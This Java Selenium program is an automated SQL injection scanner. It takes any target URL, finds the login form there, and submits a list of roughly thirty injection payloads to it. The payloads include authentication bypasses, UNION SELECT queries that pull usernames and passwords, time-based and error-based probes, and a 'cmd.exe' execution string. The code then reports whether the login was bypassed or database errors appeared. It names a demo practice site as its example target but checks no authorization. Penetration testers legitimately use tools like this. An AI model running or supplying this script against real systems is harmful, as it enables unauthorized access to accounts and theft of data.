package UI;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.edge.EdgeDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;
import org.openqa.selenium.TimeoutException;
import org.openqa.selenium.NoSuchElementException;

import io.github.bonigarcia.wdm.WebDriverManager;

import java.time.Duration;
import java.util.Scanner;
import java.util.List;
import java.util.ArrayList;

public class AdvancedSQLInjection {

	// Browser type (e.g., "Chrome", "Edge").
	public static String browser;

	// Main WebDriver instance to control the browser.
	public static WebDriver driver;

	// --- Helper class to store found login form elements ---
	// Holds the username field, password field, and login button.
	static class LoginElements {
		WebElement usernameField;
		WebElement passwordField;
		WebElement loginButton;

		public LoginElements(WebElement usernameField, WebElement passwordField, WebElement loginButton) {
			this.usernameField = usernameField;
			this.passwordField = passwordField;
			this.loginButton = loginButton;
		}
	}

	// Sets up and initializes the chosen web browser.
	public static void setUpDriver() {
		System.out.println("Launching browser: " + browser);
		if (browser.equalsIgnoreCase("Edge")) {
			WebDriverManager.edgedriver().setup();
			driver = new EdgeDriver();
		} else {
			WebDriverManager.chromedriver().setup();
			driver = new ChromeDriver();
		}
		driver.manage().window().maximize(); // Maximize browser window.
	}

	// Pauses execution for a specified number of seconds.
	public static void pause(int seconds) {
		try {
			Thread.sleep(seconds * 1000);
		} catch (InterruptedException e) {
			e.printStackTrace();
			Thread.currentThread().interrupt();
		}
	}

	// --- Automatically finds login form elements on the page ---
	// Tries various locators for username, password, and login button.
	public static LoginElements findLoginElements(WebDriver driver) {
		WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));

		WebElement usernameField = null;
		WebElement passwordField = null;
		WebElement loginButton = null;

		System.out.println("Attempting to automatically detect the login form...");

		// Locators for password field.
		List<By> passwordLocators = new ArrayList<>();
		passwordLocators.add(By.xpath("//input[@type='password' and @name='passw']"));
		passwordLocators.add(By.xpath("//input[@type='password' and @id='password']"));
		passwordLocators.add(By.xpath("//input[@type='password' and @name='password']"));
		passwordLocators.add(By.xpath("//input[@type='password' and contains(@id, 'pass')]"));
		passwordLocators.add(By.xpath("//input[@type='password' and contains(@name, 'pass')]"));
		passwordLocators.add(By.xpath("//input[@type='password']"));

		for (By locator : passwordLocators) {
			try {
				passwordField = wait.until(ExpectedConditions.presenceOfElementLocated(locator));
				System.out.println("  ✅ Password field found: " + locator);
				break;
			} catch (TimeoutException | NoSuchElementException e) {
				// Continue to next locator.
			}
		}

		// Locators for username field.
		List<By> usernameLocators = new ArrayList<>();
		usernameLocators.add(By.xpath("//input[@type='text' and @name='uid']"));
		usernameLocators.add(By.xpath("//input[@type='text' and @id='username']"));
		usernameLocators.add(By.xpath("//input[@type='text' and @name='username']"));
		usernameLocators.add(By.xpath("//input[@type='text' and contains(@id, 'user')]"));
		usernameLocators.add(By.xpath("//input[@type='email' and contains(@id, 'email')]"));
		usernameLocators.add(By.xpath("//input[@type='text' and contains(@name, 'user')]"));
		usernameLocators.add(By.xpath(
				"//input[not(@type='password') and (contains(@id, 'user') or contains(@name, 'user') or contains(@id, 'login') or contains(@name, 'login'))]"));
		usernameLocators.add(By.xpath("//input[not(@type='password') and (@type='text' or @type='email')]"));

		for (By locator : usernameLocators) {
			try {
				usernameField = wait.until(ExpectedConditions.presenceOfElementLocated(locator));
				// Ensure username field is not the same as password field.
				if (passwordField != null && usernameField.equals(passwordField)) {
					usernameField = null;
					continue;
				}
				System.out.println("  ✅ Username field found: " + locator);
				break;
			} catch (TimeoutException | NoSuchElementException e) {
				// Continue to next locator.
			}
		}

		// Locators for login button.
		List<By> buttonLocators = new ArrayList<>();
		buttonLocators.add(By.name("btnSubmit"));
		buttonLocators.add(By.xpath("//input[@type='submit']"));
		buttonLocators.add(By.xpath("//button[@type='submit']"));
		buttonLocators.add(By.xpath(
				"//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'login')]"));
		buttonLocators.add(By.xpath(
				"//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'sign in')]"));
		buttonLocators.add(By.xpath(
				"//input[contains(translate(@value, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'login')]"));
		buttonLocators.add(By.xpath(
				"//input[contains(translate(@value, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'sign in')]"));

		for (By locator : buttonLocators) {
			try {
				loginButton = wait.until(ExpectedConditions.elementToBeClickable(locator));
				System.out.println("  ✅ Login button found: " + locator);
				break;
			} catch (TimeoutException | NoSuchElementException e) {
				// Continue to next locator.
			}
		}

		// Return found elements or null if incomplete.
		if (usernameField != null && passwordField != null && loginButton != null) {
			System.out.println("  👍 All required form elements found automatically.");
			return new LoginElements(usernameField, passwordField, loginButton);
		} else {
			System.err.println("  ❌ Failed to automatically find all login elements.");
			System.err.println("    Found: Username: " + (usernameField != null) + ", Password: "
					+ (passwordField != null) + ", Button: " + (loginButton != null));
			return null;
		}
	}

	public static void main(String[] args) {
		// Print ASCII art logo.
		String asciiArt = "  ____  ____  __    _  _  _  _  ____ \n" + " (  _ \\(  __)(  )  / )( \\( \\/ )(  __)\n"
				+ "  ) D ( ) _) / (_/\\) \\/ ( )  (  ) _) \n" + " (____/(____)\\____/\\____/(_/\\_)(____)\n"
				+ "***************************************\n" + "* Copyright 2025, ★DSL★         *\n"
				+ "* https://github.com/DSL-21         *\n" + "***************************************";
		System.out.println(asciiArt);
		System.out.println("--- Advanced SQL Injection ---");

		Scanner scanner = new Scanner(System.in);
		String targetUrl = "";

		// --- User browser selection ---
		System.out.println("\nSelect browser for testing:");
		System.out.println("1. Chrome (default)");
		System.out.println("2. Edge");
		System.out.print("Enter number (1 or 2): ");
		String browserChoice = scanner.nextLine().trim();

		switch (browserChoice) {
		case "2":
			browser = "Edge";
			break;
		case "1":
		default:
			browser = "Chrome";
			break;
		}
		// --- END BROWSER SELECTION ---

		// Prompt for target URL.
		System.out.println(
				"Please, enter the URL of the website to perform SQL Injection test on (e.g., https://demo.testfire.net/login.jsp):");
		targetUrl = scanner.nextLine();

		// --- Validate and fix URL protocol ---
		if (!targetUrl.startsWith("http://") && !targetUrl.startsWith("https://")) {
			System.out.println("  ℹ️ URL protocol missing. Prepending 'https://' to: " + targetUrl);
			targetUrl = "https://" + targetUrl;
		}

		setUpDriver(); // Launch the chosen browser.
		System.out.println("🧪 Starting advanced SQL Injection test on: " + targetUrl);

		// Array of SQL Injection payloads.
		String[] sqlPayloads = {
				// Basic authentication bypasses
				"' OR '1'='1", "' OR 1=1 --", "' OR '1'='1' --", "' OR 1=1#", "' OR 1=1/*", "' OR ''='", "admin' --",
				"' OR 'x'='x", "' or ''='", "'='", "1'1", "' OR 'test'='test", "\" OR \"1\"=\"1",

				// Union SELECT injections (example, specific to columns)
				"' UNION SELECT null, null--", "' UNION SELECT null, null, null--",
				"' UNION SELECT username, password FROM Users--",
				"' UNION SELECT 1, 'injected_user', 'injected_pass'--", "' UNION SELECT @@version, database()--",
				"' UNION SELECT banner, null FROM v$version--",

				// Time-based Blind SQL Injection (causes delays)
				"' OR SLEEP(5)--", "' WAITFOR DELAY '0:0:05'--", "' AND 1=(SELECT SLEEP(5))--",

				// Error-based SQL Injection (causes database errors)
				"' AND (SELECT 1 FROM non_existent_table)--", "' AND 1=CAST((SELECT @@version) AS INT)--",
				"' AND 1=UTL_INADDR.get_host_name((SELECT user FROM dual))--",

				// Obfuscation and other techniques
				"%27%20OR%20%271%27%3D%271", "'/**/OR/**/'1'='1", "' AND '1'='1' UNION SELECT 1,2,3/*",
				"' or getpgid(0)=0--", "'; exec 'cmd.exe /c calc.exe' --", };

		// Indicators for successful login bypass.
		String successLoginIndicator = "Congratulations!";
		String welcomeTextIndicator = "Welcome";

		// Common database error messages for detection.
		String[] databaseErrorIndicators = { "SQLSTATE", "ORA-", "syntax error", "mysql_fetch_array()", "odbc_exec()",
				"Warning: mysql_query()", "Unclosed quotation mark",
				"supplied argument is not a valid MySQL result resource", "Fatal error", "exception",
				"java.sql.SQLException", "Access denied for user", "column count doesn't match value count" };

		boolean injectionFound = false; // Flag if any injection is successful.

		// Loop through each SQL payload and test it.
		for (int i = 0; i < sqlPayloads.length; i++) {
			String currentPayload = sqlPayloads[i];
			long startTime = System.currentTimeMillis();

			driver.manage().deleteAllCookies(); // Clear cookies before each attempt.
			driver.get(targetUrl); // Navigate to target URL.

			System.out.println("\n--- Attempt #" + (i + 1) + " with payload: " + currentPayload + " ---");

			try {
				// Find login form elements.
				LoginElements elements = findLoginElements(driver);
				if (elements == null) {
					System.err.println("  ❌ Cannot proceed, login elements were not found.");
					break;
				}

				WebElement usernameField = elements.usernameField;
				WebElement passwordField = elements.passwordField;
				WebElement loginButton = elements.loginButton;

				// Clear fields and inject payload.
				usernameField.clear();
				passwordField.clear();
				usernameField.sendKeys(currentPayload);
				passwordField.sendKeys(currentPayload);
				loginButton.click();

				WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(15));

				boolean bypassed = false;
				boolean errorDetected = false;
				String detectedErrorMessage = "";

				// 1. Check for time-based injection.
				if (currentPayload.contains("SLEEP") || currentPayload.contains("WAITFOR DELAY")) {
					long endTime = System.currentTimeMillis();
					long responseTime = endTime - startTime;
					if (responseTime > 4000) {
						System.out.println(
								"  ✅ Time-based SQL Injection DETECTED! Response time: " + responseTime + "ms");
						injectionFound = true;
						bypassed = true;
					}
				}

				// 2. Check for successful login bypass.
				try {
					bypassed = wait.until(ExpectedConditions.or(ExpectedConditions.urlContains("bank.jsp"),
							ExpectedConditions.visibilityOfElementLocated(
									By.xpath("//*[contains(text(), '" + successLoginIndicator + "')]")),
							ExpectedConditions.visibilityOfElementLocated(
									By.xpath("//*[contains(text(), '" + welcomeTextIndicator + "')]"))));

					if (bypassed) {
						System.out.println("  🚨 SQL Injection: AUTHENTICATION BYPASSED!");
						System.out.println("  => Current URL: " + driver.getCurrentUrl());
						injectionFound = true;
						break;
					}
				} catch (TimeoutException e) {
					bypassed = false;
				}

				// 3. Check for database error messages.
				if (!bypassed) {
					String pageSource = driver.getPageSource();
					for (String error : databaseErrorIndicators) {
						if (pageSource.toLowerCase().contains(error.toLowerCase())) {
							errorDetected = true;
							detectedErrorMessage = error;
							break;
						}
					}
					if (errorDetected) {
						System.out.println("  🚨 SQL Injection: DATABASE ERROR DETECTED!");
						System.out.println("  => Detected error message: '" + detectedErrorMessage + "'");
						injectionFound = true;
						break;
					}
				}

				// If no bypass or error, attempt failed.
				if (!bypassed && !errorDetected) {
					System.out.println("  ❌ Attempt failed: Input rejected or no vulnerability detected.");
				}

			} catch (Exception e) {
				System.out.println("  ⚠️ An error occurred during test with payload: " + currentPayload);
				System.out.println("  Error: " + e.getMessage());
			}
		}

		pause(3);
		driver.quit();
		scanner.close();
		System.out.println("\n🔚 Test finished.");
		// Final summary.
		if (injectionFound) {
			System.out.println("🎉 SQL Injection vulnerability DETECTED during the test with at least one payload!");
		} else {
			System.out.println("😞 SQL Injection vulnerability NOT detected by any of the tested payloads.");
		}
	}
}
